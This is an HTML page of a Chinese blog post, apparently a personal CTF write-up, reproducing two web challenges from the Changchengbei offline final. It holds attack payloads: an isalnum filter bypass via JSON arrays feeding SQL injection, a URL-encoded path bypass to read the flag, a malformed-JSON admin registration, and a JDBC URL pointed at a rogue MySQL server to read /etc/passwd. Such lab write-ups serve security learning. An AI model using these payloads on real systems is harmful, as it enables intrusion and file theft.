@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="images/favicon.ico">
+  <title>长城杯线下赛赛后复现 | fmyyy</title>
+  <meta name="author" content="fmyyy" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="长城杯线下赛赛后复现前言去打了长城杯决赛，结果全程坐牢，果然不联网的web太难了，赛后拿到了两个web靶机的wp，复现一下。 fancyapi目录结构    逻辑很简单，web用的是python的flask框架，然后go写了几个接口处理数据。 看看backend.go 12345678910111213141516171819202122232425262728293031func Flag(w">
+<meta property="og:type" content="article">
+<meta property="og:title" content="长城杯线下赛赛后复现">
+<meta property="og:url" content="https://fmyyy.gitee.io/2021/10/13/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="fmyyy">
+<meta property="og:description" content="长城杯线下赛赛后复现前言去打了长城杯决赛，结果全程坐牢，果然不联网的web太难了，赛后拿到了两个web靶机的wp，复现一下。 fancyapi目录结构    逻辑很简单，web用的是python的flask框架，然后go写了几个接口处理数据。 看看backend.go 12345678910111213141516171819202122232425262728293031func Flag(w">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta property="article:published_time" content="2021-10-13T04:10:04.000Z">
+<meta property="article:modified_time" content="2021-10-13T22:51:24.000Z">
+<meta property="article:author" content="fmyyy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/hf1.jpg');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>归档</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>Friends</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/fmyyy1">CSDN</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>联系</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a href="/null">QQ:254005846</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">fmyyy</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>fmyyy</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center">长城杯线下赛赛后复现</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><i class="fa fa-calendar"></i> 2021-10-13</li>
+                <li><i class="fa fa-user"></i> 作者 fmyyy</li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~6.33K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                本文最后编辑于 <time datetime="1634165484000"></time> 前，其中的内容可能需要更新。
+            </div>
+            
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">长城杯线下赛赛后复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fancyapi"><span class="toc-number">1.2.</span> <span class="toc-text">fancyapi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#work"><span class="toc-number">1.3.</span> <span class="toc-text">work</span></a></li></ol></li></ol>
+                </div>
+            
+            <hr />
+            <h1 id="长城杯线下赛赛后复现"><a href="#长城杯线下赛赛后复现" class="headerlink" title="长城杯线下赛赛后复现"></a>长城杯线下赛赛后复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>去打了长城杯决赛，结果全程坐牢，果然不联网的web太难了，赛后拿到了两个web靶机的wp，复现一下。</p>
+<h2 id="fancyapi"><a href="#fancyapi" class="headerlink" title="fancyapi"></a>fancyapi</h2><p>目录结构</p>
+<p> <img src="http://img.le1a.com/2021/10/13/6c722814978b9.png" alt="1634087522346.png"> </p>
+<p>逻辑很简单，web用的是python的flask框架，然后go写了几个接口处理数据。</p>
+<p>看看backend.go</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flag</span><span class="params">(w http.ResponseWriter, r *http.Request )</span></span> &#123;</span><br><span class="line">	action:= r.URL.Query().Get(<span class="string">&quot;action&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> action == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error getting action&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	token:= r.URL.Query().Get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error getting token&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> secret <span class="keyword">string</span></span><br><span class="line">	row := db.Sqlite.QueryRow(<span class="string">&quot;SELECT secret FROM token;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err := row.Scan(&amp;secret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error querying secret token&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span> &amp;&amp; secret == token &#123;</span><br><span class="line">		data, err := ioutil.ReadFile(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fail(w, <span class="string">&quot;Error reading flag&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		ok(w, fmt.Sprintf(<span class="string">&quot;Congrats this is your flag: %s&quot;</span>, <span class="keyword">string</span>(data)))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	ok(w, <span class="string">&quot;Wrong token&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>关键就在这里，action要==readFlag，secret==token，这个token的值是在数据库里的，再看</p>
+<p> <img src="http://img.le1a.com/2021/10/13/0fc28e9a0e6ec.png" alt="1634087643831.png"></p>
+<p>这里是可以造成sql注入的，注出token即可，但有个过滤，比赛时没有绕过去。。。然后基本上都在想办绕过这个过滤了。。</p>
+<p>在app.py处</p>
+ <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;search.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;name&#x27;</span>], <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> data[<span class="string">&#x27;name&#x27;</span>].isalnum():</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;votes&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;votes&#x27;</span>], <span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/search&quot;</span>, data=request.data)</span><br><span class="line">        <span class="keyword">return</span> jsonify(r.json())</span><br></pre></td></tr></table></figure>
+
+<p>/search路由的提交的数据传入go接口进行数据库查询，也就是上面sql注入的地方，提交方式为json。</p>
+<p>vote参数为整数型，关键在name参数处有个isalnum。</p>
+<p>绕过方法为多参数，但我比赛的时候尝试了多参数但是没有绕过去。后来拿到了wp，在本地简单复现一下。</p>
+<p>搭建一个简单的app.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;it is GET&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;name&#x27;</span>], <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> data[<span class="string">&#x27;name&#x27;</span>].isalnum():</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;votes&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;votes&#x27;</span>], <span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Legal data&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>因为isalnum的过滤只能提交字母和数字，如图</p>
+<p> <img src="http://img.le1a.com/2021/10/13/75382126f5c04.png" alt="1634089479771.png"></p>
+<p>上面说了多参数，我只想到覆盖，看了wp用的是<code>[]</code>绕过</p>
+<p><img src="http://img.le1a.com/2021/10/13/39a2ceb343720.png" alt="1634089598924.png"></p>
+<p>附上一张比赛时的原图（不是我做的）</p>
+<p><img src="http://img.le1a.com/2021/10/13/cb5bf15644766.png" alt="1634089801686.png"></p>
+<p> 这之后还有个过滤</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> unquote(path):</span><br><span class="line">        action = request.args.get(<span class="string">&#x27;action&#x27;</span>)</span><br><span class="line">        token = request.args.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(action)</span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Sorry, readFlag is not permitted&quot;</span>&#125;)</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>, params=&#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: action,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>要传入action=”readFlag”但这里对readFlag有过滤 </p>
+<p>readFlag没法绕，这里是对路由进行绕过，这里判断当请求路径为/flag时才进行下面的判断，所以</p>
+<p><code>%66lag?action=readFlag</code>即可</p>
+<p>比赛时觉得无解，现在看来学到了很多，还是太菜了</p>
+<h2 id="work"><a href="#work" class="headerlink" title="work"></a>work</h2><p>一道java题，比赛的时候知道了大致的思路，但没有做出来，赛后复现一下。</p>
+<p>主办方后来给了jar包。所以本地复现比较容易。</p>
+<p>直接看后台操作</p>
+<p><img src="http://img.le1a.com/2021/10/13/ce13f6a231efe.png" alt="1634099540002.png"></p>
+<p>主要是这里。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String url = request.getParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">    String name = request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    String pwd = request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    ArrayList&lt;UserBean&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span>(! (url.isEmpty() || name.isEmpty() || pwd.isEmpty()))&#123;</span><br><span class="line">        JdbcUtils jdbcUtils = <span class="keyword">new</span> JdbcUtils(url,name,pwd);</span><br><span class="line">      ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里jdbc参数全可控，搭建恶意mysql服务器读文件即可</p>
+<p>但在做这个操作前需要登陆admin</p>
+<p>看注册这里</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jdbcSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Register</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/register&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">register</span><span class="params">(<span class="meta">@RequestParam(value = &quot;user&quot;, defaultValue = &quot;&#123;\&quot;username\&quot;:\&quot;hacker\&quot;,\&quot;password\&quot;:\&quot;guess\&quot;&#125;&quot;)</span>String user)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        user = user.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        Pattern pattern = Pattern.compile(<span class="string">&quot;\&quot;username\&quot;:\&quot;(.*?)\&quot;&quot;</span>);</span><br><span class="line">        Matcher matcher = pattern.matcher(user);</span><br><span class="line">        String username = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span> (matcher.find())&#123;</span><br><span class="line">            username =matcher.group();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!username.isEmpty())&#123;</span><br><span class="line">            user = user.replace(username, <span class="string">&quot;\&quot;username\&quot;:\&quot;hacker\&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        UserBean o = JSON.parseObject(user, UserBean.class);</span><br><span class="line">        JdbcUtils jdbcUtils = <span class="keyword">new</span> JdbcUtils(<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/www?serverTimezone=UTC&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line">        jdbcUtils.insert(o);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果按照常规的json格式提交，不管什么username都会被替换成hacker</p>
+<p>例如</p>
+<p><code>&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125;</code></p>
+<p><img src="http://img.le1a.com/2021/10/13/59f5fe3cb8456.png" alt="1634100998896.png"></p>
+<p>注册成功，看看表里注册进了什么数据。</p>
+<p><img src="http://img.le1a.com/2021/10/13/6b31bc87c7462.png" alt="1634101057250.png"></p>
+<p>所以要绕过正则，这个正则很简单，用大小写或者畸形json数据即可，这里去掉双引号变成</p>
+<p><code>&#123;username:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125;</code></p>
+<p><img src="http://img.le1a.com/2021/10/13/80b84197822e7.png" alt="1634101169503.png"></p>
+<p>可以看到注册成功了。登陆</p>
+<p><code>/login?data=&#123;username:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125;</code></p>
+<p>登陆成功后来到admin。</p>
+<p>先起恶意mysql服务器。</p>
+<p>脚本地址</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p>
+<p>启动脚本访问</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/admin?url=jdbc:mysql://192.168.36.2:3306/www?serverTimezone=UTC&amp;name=123&amp;pwd=123">http://127.0.0.1:8080/admin?url=jdbc:mysql://192.168.36.2:3306/www?serverTimezone=UTC&amp;name=123&amp;pwd=123</a></p>
+<p><img src="http://img.le1a.com/2021/10/14/1bea25de2211c.png" alt="1634165197538.png"></p>
+<p>读到/etc/passwd   之后读flag就行。</p>
+<p>这题应该还可以用jdbc反序列化，之后学了再来试试。</p>
+
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://fmyyy.gitee.io/2021/10/13/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://fmyyy.gitee.io/2021/10/13/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/";
+            const title         = "「长城杯线下赛赛后复现」";
+            const excerpt       = `长城杯线下赛赛后复现前言去打了长城杯决赛，结果全程坐牢，果然不联网的web太难了，赛后拿到了两个web靶机的wp，复现一下。
+fancyapi目录结构
+  
+逻辑很简单，web用的是python的flask框架，然后go写了几个接口处...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                <span>最后编辑：2021-10-14</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" java反序列化-改造CC3攻击shiro" href="/2021/10/03/java反序列化-改造CC3攻击shiro/">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" 2021东华杯一道java题" href="/2021/11/05/2021东华杯一道java题/">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/tou.jpg" />
+        </div>
+    </div>
